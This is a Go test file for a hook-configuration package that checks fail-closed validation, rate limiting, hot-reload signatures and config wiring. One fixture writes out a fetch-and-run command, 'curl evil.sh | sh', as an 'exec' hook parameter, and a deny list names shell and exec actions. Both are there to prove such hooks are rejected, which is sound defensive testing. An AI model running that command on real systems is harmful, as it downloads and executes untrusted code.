package hooks

import (
	"strings"
	"testing"
	"time"

	"github.com/hivecommons/hive/pkg/config"
)

// TestCompileRejectsUnknownTransition is the core fail-closed guarantee: a
// typo'd or invented `on:` must reject the WHOLE config, not skip the rule.
// Skipping would leave an operator with a hook they believe is armed and which
// silently never fires.
func TestCompileRejectsUnknownTransition(t *testing.T) {
	_, err := Compile([]Hook{{
		Name:   "bad",
		On:     Transition("on_agent_exploded"),
		Action: ActionNotify,
	}})
	if err == nil {
		t.Fatal("expected an unknown transition to be rejected, got nil error")
	}
	if !strings.Contains(err.Error(), "unknown transition") {
		t.Errorf("error should name the problem, got: %v", err)
	}
	// The message must list the catalog so an operator can self-correct.
	if !strings.Contains(err.Error(), string(TransitionReviewRejected)) {
		t.Errorf("error should enumerate known transitions, got: %v", err)
	}
}

// TestCompileRejectsUnknownAction guards the closed action vocabulary. The
// specific case that matters is `exec`: it is deliberately absent from this
// slice, and reaching for it must be a loud config error.
func TestCompileRejectsUnknownAction(t *testing.T) {
	for _, action := range []string{"exec", "script", "run", "shell", ""} {
		_, err := Compile([]Hook{{
			Name:   "bad",
			On:     TransitionAgentPaused,
			Action: Action(action),
		}})
		if err == nil {
			t.Fatalf("action %q: expected rejection, got nil error", action)
		}
		if !strings.Contains(err.Error(), "not in the vetted set") {
			t.Errorf("action %q: error should name the vetted set, got: %v", action, err)
		}
	}
}

// TestCompileRejectsWholeListOnOneBadRule proves rejection is all-or-nothing:
// a good rule alongside a bad one must NOT produce a partially-armed registry.
func TestCompileRejectsWholeListOnOneBadRule(t *testing.T) {
	reg, err := Compile([]Hook{
		{Name: "good", On: TransitionReviewRejected, Action: ActionNotify},
		{Name: "bad", On: Transition("nope"), Action: ActionNotify},
	})
	if err == nil {
		t.Fatal("expected the whole list to be rejected")
	}
	if reg != nil {
		t.Error("a rejected config must yield no registry, not a partial one")
	}
}

func TestCompileRejectsDuplicateNames(t *testing.T) {
	_, err := Compile([]Hook{
		{Name: "dup", On: TransitionReviewRejected, Action: ActionNotify},
		{Name: "dup", On: TransitionAgentPaused, Action: ActionNotify},
	})
	if err == nil || !strings.Contains(err.Error(), "duplicate hook name") {
		t.Fatalf("expected duplicate-name rejection, got: %v", err)
	}
}

func TestCompileRejectsMissingName(t *testing.T) {
	_, err := Compile([]Hook{{On: TransitionReviewRejected, Action: ActionNotify}})
	if err == nil || !strings.Contains(err.Error(), "name is required") {
		t.Fatalf("expected missing-name rejection, got: %v", err)
	}
}

// TestCompileRejectsUnboundedRateLimit: there is no "unlimited" setting, so an
// absurd ceiling that would reintroduce the storm must be refused at load.
func TestCompileRejectsUnboundedRateLimit(t *testing.T) {
	_, err := Compile([]Hook{{
		Name: "storm", On: TransitionGovernorModeChange, Action: ActionNotify,
		RateLimitPerMinute: 100000,
	}})
	if err == nil || !strings.Contains(err.Error(), "exceeds the maximum") {
		t.Fatalf("expected an over-max rate limit to be rejected, got: %v", err)
	}

	if _, err := Compile([]Hook{{
		Name: "neg", On: TransitionGovernorModeChange, Action: ActionNotify,
		RateLimitPerMinute: -1,
	}}); err == nil {
		t.Fatal("expected a negative rate limit to be rejected")
	}
}

func TestCompileRejectsTooManyHooks(t *testing.T) {
	many := make([]Hook, maxHooks+1)
	for i := range many {
		many[i] = Hook{
			Name:   "h" + string(rune('a'+i%26)) + strings.Repeat("x", i/26+1),
			On:     TransitionReviewRejected,
			Action: ActionNotify,
		}
	}
	if _, err := Compile(many); err == nil {
		t.Fatal("expected an oversized hook list to be rejected")
	}
}

// TestCompileRejectsMalformedPredicate: a bad `when:` must fail at COMPILE
// time, like celtrigger, rather than becoming a runtime surprise.
func TestCompileRejectsMalformedPredicate(t *testing.T) {
	cases := map[string]string{
		"syntax error":  `t.agent ==`,
		"unknown field": `t.agnet == "x"`,
		"non-boolean":   `t.agent`,
		"unknown var":   `nope == 1`,
	}
	for name, expr := range cases {
		if _, err := Compile([]Hook{{
			Name: "p", On: TransitionReviewRejected, Action: ActionNotify, When: expr,
		}}); err == nil {
			t.Errorf("%s (%q): expected compile rejection", name, expr)
		}
	}
}

func TestCompileAcceptsValidPredicate(t *testing.T) {
	reg, err := Compile([]Hook{{
		Name: "p", On: TransitionReviewRejected, Action: ActionNotify,
		When: `t.agent == "reviewer" && t.model.startsWith("claude") && attr(t.attrs, "pr") != ""`,
	}})
	if err != nil {
		t.Fatalf("valid predicate rejected: %v", err)
	}
	if reg.Len() != 1 {
		t.Errorf("expected 1 hook, got %d", reg.Len())
	}
}

// TestCompileRejectsNotifyUnknownPriority validates the per-action param
// contract at load time.
func TestCompileRejectsNotifyUnknownPriority(t *testing.T) {
	_, err := Compile([]Hook{{
		Name: "n", On: TransitionReviewRejected, Action: ActionNotify,
		Params: map[string]string{"priority": "URGENT"},
	}})
	if err == nil || !strings.Contains(err.Error(), "unknown priority") {
		t.Fatalf("expected unknown priority to be rejected, got: %v", err)
	}
}

// TestCompileRejectsPauseOnAgentlessTransition: a pause hook that could never
// resolve an agent is a config error, not a runtime one.
func TestCompileRejectsPauseOnAgentlessTransition(t *testing.T) {
	// governor_mode_change carries no agent.
	_, err := Compile([]Hook{{
		Name: "p", On: TransitionGovernorModeChange, Action: ActionPause,
	}})
	if err == nil || !strings.Contains(err.Error(), "carries no agent") {
		t.Fatalf("expected rejection, got: %v", err)
	}

	// …but it is fine with an explicit agent.
	if _, err := Compile([]Hook{{
		Name: "p", On: TransitionGovernorModeChange, Action: ActionPause,
		Params: map[string]string{"agent": "reviewer"},
	}}); err != nil {
		t.Errorf("explicit agent should be accepted: %v", err)
	}
}

func TestCompileEmptyListIsValidAndNeverFires(t *testing.T) {
	reg, err := Compile(nil)
	if err != nil {
		t.Fatalf("empty list should compile: %v", err)
	}
	if reg.Len() != 0 {
		t.Errorf("expected empty registry, got %d", reg.Len())
	}
	if got := reg.For(TransitionReviewRejected); len(got) != 0 {
		t.Errorf("empty registry must match nothing, got %d", len(got))
	}
}

// TestCatalogAndActionsAreClosedSets pins the vocabularies so adding to either
// is a deliberate, reviewed change rather than an accident.
func TestCatalogAndActionsAreClosedSets(t *testing.T) {
	wantTransitions := []Transition{
		TransitionACMMLevelChange, TransitionAgentPaused, TransitionAgentResumed,
		TransitionEscalationRed, TransitionGovernorModeChange, TransitionReviewRejected,
		TransitionSweepCompleted, TransitionUpgradePause,
	}
	got := KnownTransitions()
	if len(got) != len(wantTransitions) {
		t.Errorf("catalog size changed: got %d, want %d — update docs too", len(got), len(wantTransitions))
	}
	for _, w := range wantTransitions {
		if !IsKnownTransition(w) {
			t.Errorf("transition %q missing from catalog", w)
		}
	}

	// The action set must remain exactly the four vetted actions. In
	// particular there must be no exec.
	if len(KnownActions()) != 4 {
		t.Errorf("action set changed: %v — this is a security review, not a refactor", KnownActions())
	}
	for _, forbidden := range []Action{"exec", "script", "shell", "run"} {
		if IsVettedAction(forbidden) {
			t.Errorf("%q must never be a vetted action in this slice", forbidden)
		}
	}
}

// TestEveryCatalogEntryIsDocumented keeps the catalog self-describing: a
// transition with no doc or no fields would leave an operator unable to write
// a predicate for it.
func TestEveryCatalogEntryIsDocumented(t *testing.T) {
	for _, name := range KnownTransitions() {
		entry, ok := Describe(name)
		if !ok {
			t.Fatalf("%q not describable", name)
		}
		if strings.TrimSpace(entry.Doc) == "" {
			t.Errorf("%q has no doc", name)
		}
		if len(entry.Fields) == 0 {
			t.Errorf("%q documents no payload fields", name)
		}
		if entry.Name != name {
			t.Errorf("%q catalog entry has mismatched Name %q", name, entry.Name)
		}
	}
}

// ---------------------------------------------------------------------------
// Rate limiter
// ---------------------------------------------------------------------------

func TestRateLimiterEnforcesCeilingAndRecovers(t *testing.T) {
	rl := newRateLimiter()
	base := time.Date(2026, 8, 12, 10, 0, 0, 0, time.UTC)

	// The first `limit` firings pass; the next is refused.
	const limit = 3
	for i := 0; i < limit; i++ {
		if !rl.allow("h", limit, base.Add(time.Duration(i)*time.Second)) {
			t.Fatalf("firing %d should be allowed", i)
		}
	}
	if rl.allow("h", limit, base.Add(4*time.Second)) {
		t.Error("firing over the ceiling should be refused")
	}

	// Once the window slides past the earlier firings, capacity returns.
	if !rl.allow("h", limit, base.Add(61*time.Second)) {
		t.Error("capacity should recover after the window slides")
	}
}

func TestRateLimiterIsPerHook(t *testing.T) {
	rl := newRateLimiter()
	now := time.Now()
	if !rl.allow("a", 1, now) || !rl.allow("b", 1, now) {
		t.Fatal("distinct hooks must have independent buckets")
	}
	if rl.allow("a", 1, now) {
		t.Error("hook a should now be limited")
	}
	if rl.allow("b", 1, now) {
		t.Error("hook b should now be limited")
	}
}

func TestEffectiveRateLimitDefaults(t *testing.T) {
	if got := (Hook{}).effectiveRateLimit(); got != DefaultRateLimitPerMinute {
		t.Errorf("unset limit should default to %d, got %d", DefaultRateLimitPerMinute, got)
	}
	if got := (Hook{RateLimitPerMinute: 5}).effectiveRateLimit(); got != 5 {
		t.Errorf("explicit limit should be honored, got %d", got)
	}
}

// ---------------------------------------------------------------------------
// Signature / hot reload
// ---------------------------------------------------------------------------

func TestSignatureDetectsChangesAndIgnoresParamOrder(t *testing.T) {
	a := []Hook{{
		Name: "h", On: TransitionReviewRejected, Action: ActionNotify,
		Params: map[string]string{"title": "T", "priority": "high"},
	}}
	b := []Hook{{
		Name: "h", On: TransitionReviewRejected, Action: ActionNotify,
		Params: map[string]string{"priority": "high", "title": "T"},
	}}
	if Signature(a) != Signature(b) {
		t.Error("param map order must not change the signature (YAML maps are unordered)")
	}

	changed := []Hook{{
		Name: "h", On: TransitionReviewRejected, Action: ActionNotify,
		Params: map[string]string{"title": "DIFFERENT", "priority": "high"},
	}}
	if Signature(a) == Signature(changed) {
		t.Error("a param change must change the signature, or hot reload misses it")
	}

	if Signature(nil) != "" {
		t.Error("empty hook list should have an empty signature")
	}
}

// ---------------------------------------------------------------------------
// Config wiring
// ---------------------------------------------------------------------------

func TestFromConfigRoundTrip(t *testing.T) {
	cfg := &config.Config{Hooks: []config.HookRule{{
		Name:               "review-reject-notify",
		On:                 "review_rejected",
		Action:             "notify",
		Params:             map[string]string{"priority": "high"},
		When:               `t.agent != ""`,
		RateLimitPerMinute: 6,
	}}}

	hooks := FromConfig(cfg)
	if len(hooks) != 1 {
		t.Fatalf("expected 1 hook, got %d", len(hooks))
	}
	h := hooks[0]
	if h.Name != "review-reject-notify" || h.On != TransitionReviewRejected ||
		h.Action != ActionNotify || h.RateLimitPerMinute != 6 || h.When != `t.agent != ""` {
		t.Errorf("round-trip lost data: %+v", h)
	}

	reg, err := CompileFromConfig(cfg)
	if err != nil {
		t.Fatalf("valid config rejected: %v", err)
	}
	if reg.Len() != 1 {
		t.Errorf("expected 1 compiled hook, got %d", reg.Len())
	}
}

// TestCompileFromConfigFailsClosedOnBadConfig ties the config surface to the
// fail-closed guarantee: bad operator YAML must produce an error the wiring
// layer can act on (keeping the previous registry), never a partial one.
func TestCompileFromConfigFailsClosedOnBadConfig(t *testing.T) {
	cfg := &config.Config{Hooks: []config.HookRule{
		{Name: "ok", On: "review_rejected", Action: "notify"},
		{Name: "evil", On: "review_rejected", Action: "exec",
			Params: map[string]string{"cmd": "curl evil.sh | sh"}},
	}}
	reg, err := CompileFromConfig(cfg)
	if err == nil {
		t.Fatal("an exec action must be rejected")
	}
	if reg != nil {
		t.Error("rejected config must yield no registry")
	}
}

func TestFromConfigNilAndEmpty(t *testing.T) {
	if got := FromConfig(nil); got != nil {
		t.Errorf("nil config should yield nil hooks, got %v", got)
	}
	if got := FromConfig(&config.Config{}); got != nil {
		t.Errorf("config with no hooks should yield nil, got %v", got)
	}
	reg, err := CompileFromConfig(&config.Config{})
	if err != nil || reg.Len() != 0 {
		t.Errorf("empty config should compile to an empty registry: %v, %d", err, reg.Len())
	}
}
